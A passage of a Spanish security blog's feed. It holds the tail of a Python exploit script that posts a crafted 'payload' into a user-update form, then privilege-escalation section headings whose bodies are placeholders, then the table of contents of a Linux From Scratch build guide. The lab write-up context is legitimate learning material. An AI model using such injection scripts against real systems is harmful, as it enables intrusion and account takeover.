&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'â'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'authenticity_token'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'_method'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'patch'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'user[username]'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'commit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Update User'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/users/'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/users/'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/articles'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;inyecctando-la-shell-en-el-servidor&quot;&gt;Inyecctando la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Shell&lt;/code&gt; en el servidor&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;conseguir-la-shell-desde-el-servidor&quot;&gt;Conseguir la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Shell&lt;/code&gt; desde el servidor&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;conseguir-el-password-de-la-cuenta-de-bill-en-los-backups-del-servidor&quot;&gt;Conseguir el password de la cuenta de bill en los &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backups del servidor&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;obtener-el-codigo-de-google-authenticator&quot;&gt;Obtener el codigo de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Google Authenticator&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;usando-el-comando-sudo--l&quot;&gt;Usando el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxx&lt;/p&gt;

&lt;h2 id=&quot;con-la-ayuda-de-gtfo-bins-obtenemos-el-roottxt&quot;&gt;Con la ayuda de GTFO bins obtenemos el root.txt&lt;/h2&gt;
&lt;p&gt;xxxxxxxxxxxxxxxc&lt;/p&gt;</content><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><category term="Utilidades" /><category term="Exploits" /><category term="Vulnerabilidades" /><category term="HackTheBox" /><category term="Pentesting" /><category term="Herramientas" /><category term="Windows" /><category term="Linux" /><category term="Domain Controller" /><category term="Guías" /><category term="Privilege Escalation" /><summary type="html">Mucho se está hablando acerca de la nueva vulnerabilidad Zerologon, pero... ¿realmente es crítica?. Lo analizaremos en detalle en este artículo.</summary></entry><entry><title type="html">Cómo construir tu propio sistema Linux</title><link href="http://localhost:4000/como-crear-un-sistema-linux/" rel="alternate" type="text/html" title="Cómo construir tu propio sistema Linux" /><published>2020-04-23T00:00:00+02:00</published><updated>2020-04-23T00:00:00+02:00</updated><id>http://localhost:4000/como-crear-un-sistema-linux</id><content type="html" xml:base="http://localhost:4000/como-crear-un-sistema-linux/">&lt;h1 id=&quot;cómo-construir-tu-propio-sistema-linux-s4vios&quot;&gt;Cómo construir tu propio sistema Linux (S4viOS)&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;https://wallpaperaccess.com/full/981849.png&quot; alt=&quot;Portada OS&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Antes que nada, deciros que toda esta guía la tenéis también disponible en mi Gist, desde donde os podéis dirigir directamente a través del índice a la sección que queráis:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://gist.github.com/s4vitar/8a2b18ec1f1b16226e21d4b89cbef270&quot;&gt;https://gist.github.com/s4vitar/8a2b18ec1f1b16226e21d4b89cbef270&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Por alguna razón los eventos clickeables del índice desde esta página no son funcionales, así que cualquier cosa os podréis manejar por allí más cómodamente (No te olvides de dejar un Fav :P).&lt;/p&gt;

&lt;h2 id=&quot;índice-y-estructura-principal&quot;&gt;Índice y Estructura Principal&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#Antecedentes&quot;&gt;Antecedentes&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#Prerrequisitos&quot;&gt;Prerrequisitos&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#Introducción&quot;&gt;Introducción&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#Consideraciones&quot;&gt;Consideraciones&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#Instalando-Debian-10.3.0&quot;&gt;Instalando Debian 10.3.0&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#Configurando-el-Debian-base&quot;&gt;Configurando el Debian base&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#instalación-de-paquetes-base&quot;&gt;Instalación de paquetes base&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#bash&quot;&gt;Bash 3.2&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Binutils&quot;&gt;Binutils 2.25&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Bison&quot;&gt;Bison 2.7&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Bzip2&quot;&gt;Bzip2 1.0.4&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Coreutils&quot;&gt;Coreutils 6.9&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Diffutils&quot;&gt;Diffutils 2.8.1&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Findutils&quot;&gt;Findutils 4.2.31&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Gawk&quot;&gt;Gawk 4.0.1&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#gcc&quot;&gt;GCC 6.2&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#glibc&quot;&gt;Glibc 2.11&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Grep&quot;&gt;Grep 2.5.1&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Gzip&quot;&gt;Gzip 1.3.12&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#M4&quot;&gt;M4 1.4.10&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Make&quot;&gt;Make 4.0&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Patch&quot;&gt;Patch 2.5.4&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Perl&quot;&gt;Perl 5.8.8&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Python&quot;&gt;Python 3.4&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Sed&quot;&gt;Sed 4.1.5&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Tar&quot;&gt;Tar 1.22&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Texinfo&quot;&gt;Texinfo 4.7&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Xz&quot;&gt;Xz 5.0.0&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#version-check&quot;&gt;Version Check&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#creando-nueva-partición&quot;&gt;Creando nueva particion&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#Estructurando-la-partición-con-parted&quot;&gt;Estructurando la partición con parted&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#Descarga-de-paquetes-para-la-creación-del-sistema-base&quot;&gt;Descarga de paquetes para la creación del sistema base&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#Construyendo-un-sistema-temporal&quot;&gt;Construyendo un sistema temporal&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#Creación-de-un-nuevo-usuario&quot;&gt;Creación de un nuevo usuario&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#Compilación-de-paquetes&quot;&gt;Compilación de paquetes&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-binutils&quot;&gt;Compilación binutils&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-GCC&quot;&gt;Compilación GCC&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-API-Headers&quot;&gt;Compilación API Headers&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Glibc&quot;&gt;Compilación Glibc&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Libstdc-de-GCC&quot;&gt;Compilación Libstdc++ de GCC&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Binutils-Fase-2&quot;&gt;Compilación Binutils Fase 2&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-GCC-Fase-2&quot;&gt;Compilación GCC Fase 2&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Tcl&quot;&gt;Compilación Tcl&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Expect&quot;&gt;Compilación Expect&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-DejaGNU&quot;&gt;Compilación DejaGNU&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-M4&quot;&gt;Compilación M4&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Ncurses&quot;&gt;Compilación Ncurses&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Bash&quot;&gt;Compilación Bash&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Bison&quot;&gt;Compilación Bison&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Bzip2&quot;&gt;Compilación Bzip2&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Coreutils&quot;&gt;Compilación Coreutils&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Diffutils&quot;&gt;Compilación Diffutils&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-File&quot;&gt;Compilación File&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Findutils&quot;&gt;Compilación Findutils&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Gawk&quot;&gt;Compilación Gawk&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Gettext&quot;&gt;Compilación Gettext&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Grep&quot;&gt;Compilación Grep&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Gzip&quot;&gt;Compilación Gzip&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Make&quot;&gt;Compilación Make&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Patch&quot;&gt;Compilación Patch&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Perl&quot;&gt;Compilación Perl&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Python&quot;&gt;Compilación Python&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Sed&quot;&gt;Compilación Sed&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Tar&quot;&gt;Compilación Tar&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Texinfo&quot;&gt;Compilación Texinfo&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Compilación-Xz&quot;&gt;Compilación Xz&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#Stripping&quot;&gt;Stripping&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#Cambio-de-propietario&quot;&gt;Cambio de propietario&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#Contruyendo-el-sistema-LFS&quot;&gt;Construyendo el sistema LFS&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#Preparando-el-sistema-de-archivos-del-kernel-virtual&quot;&gt;Preparando el sistema de archivos del kernel virtual&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#Montaje-del-sistema-de-archivos-del-kernel-virtual&quot;&gt;Montaje del sistema de archivos del kernel virtual&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#Entrando-en-el-entorno-Chroot&quot;&gt;Entrando en el entorno Chroot&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#Creación-de-directorios&quot;&gt;Creación de directorios&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Creación-de-archivos-esenciales-y-links-simbólicos&quot;&gt;Creación de archivos esenciales y Links Simbólicos&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#Instalación-del-Software-básico-del-sistema&quot;&gt;Instalación del Software básico del sistema&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#API-Headers-en-LFS&quot;&gt;API Headers en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Man-pages-en-LFS&quot;&gt;Man pages en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Glibc-en-LFS&quot;&gt;Glibc en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Ajuste-de-la-Toolchain&quot;&gt;Ajuste de la Toolchain&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Zlib-en-LFS&quot;&gt;Zlib en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Bzip2-en-LFS&quot;&gt;Bzip2 en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Xz-en-LFS&quot;&gt;Xz en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#File-en-LFS&quot;&gt;File en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Readline-en-LFS&quot;&gt;Readline en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#M4-en-LFS&quot;&gt;M4 en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Bc-en-LFS&quot;&gt;Bc en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Binutils-en-LFS&quot;&gt;Binutils en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#GMP-en-LFS&quot;&gt;GMP en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#MPFR-en-LFS&quot;&gt;MPFR en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#MPC-en-LFS&quot;&gt;MPC en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Attr-en-LFS&quot;&gt;Attr en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Acl-en-LFS&quot;&gt;Acl en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Instalación-del-Shadow&quot;&gt;Instalación del Shadow&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#GCC-en-LFS&quot;&gt;GCC en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Pk-config-en-LFS&quot;&gt;Pk-config en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Ncurses-en-LFS&quot;&gt;Ncurses en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Sed-en-LFS&quot;&gt;Sed en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Psmisc-en-LFS&quot;&gt;Psmisc en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Iana-Etc-en-LFS&quot;&gt;Iana Etc en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Bison-en-LFS&quot;&gt;Bison en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Flex-en-LFS&quot;&gt;Flex en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Grep-en-LFS&quot;&gt;Grep en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Bash-en-LFS&quot;&gt;Bash en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Libtool-en-LFS&quot;&gt;Libtool en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#GDBM-en-LFS&quot;&gt;GDBM en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Gperf-en-LFS&quot;&gt;Gperf en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Expat-en-LFS&quot;&gt;Expat en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Inetutils-en-LFS&quot;&gt;Inetutils en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Perl-en-LFS&quot;&gt;Perl en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#XML-Parser-en-LFS&quot;&gt;XML::Parser en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Intltool-en-LFS&quot;&gt;Intltool en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Autoconf-en-LFS&quot;&gt;Autoconf en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Automake-en-LFS&quot;&gt;Automake en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Kmod-en-LFS&quot;&gt;Kmod en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Gettext-en-LFS&quot;&gt;Gettext en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Libelf-de-elfutils-en-LFS&quot;&gt;Libelf de Elfutils en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Libffi-en-LFS&quot;&gt;Libffi en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Openssl-en-LFS&quot;&gt;Openssl en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Python3-en-LFS&quot;&gt;Python3 en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Ninja-en-LFS&quot;&gt;Ninja en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Meson-en-LFS&quot;&gt;Meson en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Coreutils-en-LFS&quot;&gt;Coreutils en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Check-en-LFS&quot;&gt;Check en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Diffutils-en-LFS&quot;&gt;Diffutils en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Gawk-en-LFS&quot;&gt;Gawk en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Findutils-en-LFS&quot;&gt;Findutils en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Groff-en-LFS&quot;&gt;Groff en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#GRUB-en-LFS&quot;&gt;GRUB en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Less-en-LFS&quot;&gt;Less en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Gzip-en-LFS&quot;&gt;Gzip en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Zstd-en-LFS&quot;&gt;Zstd en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#IPRoute-en-LFS&quot;&gt;IPRoute en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Kbd-en-LFS&quot;&gt;Kbd en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Libpipeline-en-LFS&quot;&gt;Libpipeline en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Make-en-LFS&quot;&gt;Make en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Patch-en-LFS&quot;&gt;Patch en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Man-DB-en-LFS&quot;&gt;Man DB en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Tar-en-LFS&quot;&gt;Tar en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Texinfo-en-LFS&quot;&gt;Texinfo en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Vim-en-LFS&quot;&gt;Vim en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Procps-en-LFS&quot;&gt;Procps-ng en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Util-Linux-en-LFS&quot;&gt;Util-Linux en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#E2fsprogs-en-LFS&quot;&gt;E2fsprogs en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Sysklogd-en-LFS&quot;&gt;Sysklogd en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Sysvinit-en-LFS&quot;&gt;Sysvinit en LFS&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Eudev-en-LFS&quot;&gt;Eudev en LFS&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#Limpieza-Final&quot;&gt;Limpieza Final&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#Configuración-del-sistema&quot;&gt;Configuración del sistema&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#Instalación-de-LFS-Bootscripts&quot;&gt;Instalación de LFS Bootscripts&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Gestión-de-dispositivos&quot;&gt;Gestión de dispositivos&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Creación-de-archivos-de-configuración-de-interfaz-de-red&quot;&gt;Creación de archivos de configuración de interfaz de red&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Configurando-el-nombre-de-host-del-sistema&quot;&gt;Configurando el nombre de host del sistema&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Configurando-el-sysvinit&quot;&gt;Configurando el Sysvinit&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Configuración-del-reloj-del-sistema&quot;&gt;Configuración del reloj del sistema&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#Configuración-de-la-consola-de-linux&quot;&gt;Configuración de la consola de Linux&lt;/a&gt;&lt;/li&gt;
